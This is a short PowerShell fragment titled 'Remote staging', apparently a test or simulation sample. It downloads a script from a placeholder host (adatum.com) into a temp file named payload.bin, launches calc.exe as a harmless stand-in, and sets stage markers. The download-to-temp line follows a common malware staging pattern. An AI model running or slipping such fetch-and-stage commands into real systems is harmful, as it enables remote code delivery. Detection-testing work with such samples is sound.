
# Remote staging
$FetchUrl = "http://adatum.com/updater.ps1"
$DropPath = "$env:TEMP\payload.bin"
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DropPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Write-Verbose "stage marker 41 reached"
$StageMarker = "stage-38"
